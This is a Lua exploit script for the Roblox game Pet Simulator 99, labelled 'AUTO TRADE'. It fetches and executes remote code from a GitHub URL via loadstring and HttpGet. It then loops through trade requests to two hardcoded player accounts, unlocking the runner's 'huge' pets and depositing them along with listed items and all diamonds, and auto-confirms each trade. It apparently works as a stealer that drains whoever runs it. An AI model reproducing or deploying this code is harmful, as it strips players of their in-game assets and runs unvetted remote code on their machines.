--AUTO TRADE
wait(5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
if game.PlaceId == 8737899170 then
    getgenv().PetToTrade = {
        --{Pet = "Elegant Eagle", Patern = all, DecrementBy = 0},
        --{Pet = "Luxe Axolotl", Patern = all, DecrementBy = 0}
        --{Pet = "Pineapple Monkey", Patern = 2, DecrementBy = 0}


    }
    getgenv().ItemToTrade = {
        "Mini Pinata",
        "Mini Lucky Block",
        "Party Box",
        "Rainbow Mini Chest",
        "Mini Chest",
        "Charm Stone",
        "Large Gift Bag",
        "Gift Bag",
        "Secret Key Upper Half",
        "Void Key Upper Half",
        "Void Key Lower Half",
        "Secret Key Lower Half",
        "Crystal Key Upper Half",
        "Crystal Key Lower Half",
        "Tech Key Lower Half",
        "Tech Key Upper Half",
        "Daycare Slot Voucher",
        "Spinny Wheel Ticket",
        "Tech Spinny Wheel Ticket",
        "Void Spinny Wheel Ticket",
        "Diamond",
        "Insta Plant Capsule",
        "Seed Bag",
        "Arcade Token",
        "Hype Egg",
        "Global Event Gift",
        "Seashell",
        "Ultra Lucky Tile",
        "Lucky Tile",
        "Good vs Evil Gift",
        "Rave Gift",
        "Millionaire Bucks"
}

    local library = require(game.ReplicatedStorage.Library)
    local save = library.Save.Get()
    local inventory = library.Save.Get().Inventory

    local function GetTradeID()
        return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._id
    end

    local function GetCounter()
        return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
    end

    local function SendTrade()
        local args = {
            [1] = game:GetService("Players"):WaitForChild("REyifpof")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
        wait(1)
        local args = {
            [1] = game:GetService("Players"):WaitForChild("TrickyThyClown_6")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))

    end

    local function ReadyTrade()
        wait(3.5)
        local args = {
            [1] = GetTradeID(),
            [2] = true,
            [3] = GetCounter()
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
    end

    local function ConfirmTrade()
        repeat
            wait(1)
            local args = {
                [1] = GetTradeID(),
                [2] = true,
                [3] = GetCounter()
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Confirmed"):InvokeServer(unpack(args))

        until game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == false

    end
    

    local function UnlockPet()
        if save.Inventory.Pet ~= nil then
            for i,v in pairs(save.Inventory.Pet) do
                id = v.id
                dir = library.Directory.Pets[id]
                if dir.huge then
                    local args = {
                        [1] = i,
                        [2] = false
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                end
            end
        end 
    end



    local function DeepCopy(original)
        local copy = {}
        for key, value in pairs(original) do
            if type(value) == "table" then
                copy[key] = DeepCopy(value)
            else
                copy[key] = value
            end
        end
        return copy
    end
    
    local function DepositStatPetInTrade()
        local inventoryCopy = DeepCopy(save.Inventory.Pet)
        for i, v in pairs(inventoryCopy) do
            if v._am ~= nil then
                for _, list in ipairs(getgenv().PetToTrade) do
                    if v.id == list.Pet and (list.Patern == all or v.pt == list.Patern or (v.pt == nil and list.Patern == 0)) then
                        if list.DecrementBy and v._am >= list.DecrementBy then
                            v._am = v._am - list.DecrementBy
                        end
                        wait(0.1)
                        local args = {
                            [1] = GetTradeID(),
                            [2] = "Pet",
                            [3] = i,
                            [4] = v._am
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                    end
                end
            end
        end
    end

    local function DepositPetInTrade()
        if save.Inventory.Pet ~= nil then
            for i,v in pairs(save.Inventory.Pet) do
                id = v.id
                dir = library.Directory.Pets[id]
                if dir.huge then
                    wait(0.1)
                    local args = {
                        [1] = GetTradeID(),
                        [2] = "Pet",
                        [3] = i,
                        [4] = v._am or 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                end
            end
        end 
    end


    local function DepositItemInTrade()
        if save.Inventory.Misc ~= nil then
            for i,v in pairs(save.Inventory.Misc) do
                if v._am ~= nil then
                    for _, itemName in pairs(getgenv().ItemToTrade) do
                        if v.id == itemName then
                            wait(0.1)
                            local args = {
                                [1] = GetTradeID(),
                                [2] = "Misc",
                                [3] = i,
                                [4] = v._am
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
    end


    local function DepositSeedInTrade()
        if save.Inventory.Seed ~= nil then
            for i,v in pairs(save.Inventory.Seed) do
                if v._am ~= nil then
                    for _, itemName in pairs(getgenv().ItemToTrade) do
                        if v.id == itemName then
                            wait(0.1)
                            local args = {
                                [1] = GetTradeID(),
                                [2] = "Seed",
                                [3] = i,
                                [4] = v._am
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                            print(i, v._am, itemName)
                        end
                    end
                end
            end
        end
    end

    local function DepositGiftInTrade()
        if save.Inventory.Lootbox ~= nil then
            for i,v in pairs(inventory.Lootbox) do
                if v._am ~= nil then
                    for _, itemName in pairs(getgenv().ItemToTrade) do
                        if v.id == itemName then
                            wait(0.1)
                            local args = {
                                [1] = GetTradeID(),
                                [2] = "Lootbox",
                                [3] = i,
                                [4] = v._am
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
    end

    local function DepositDiamondsInTrade()
        if save.Inventory.Currency ~= nil then
            for i,v in pairs(save.Inventory.Currency) do
                if v.id == 'Diamonds' then
                    wait(0.1)
                    local args = {
                        [1] = GetTradeID(),
                        [2] = "Currency",
                        [3] = i,
                        [4] = v._am
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args)) 
                end
            end
        end
    end


    while true do
        wait(1)

        UnlockPet()
        SendTrade()

        if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
            DepositPetInTrade()
            DepositStatPetInTrade()
            DepositItemInTrade()
            DepositSeedInTrade()
            DepositGiftInTrade()
            DepositDiamondsInTrade()
            ReadyTrade()
            wait(1)
            ConfirmTrade()
            wait(1)
        end
    end
end

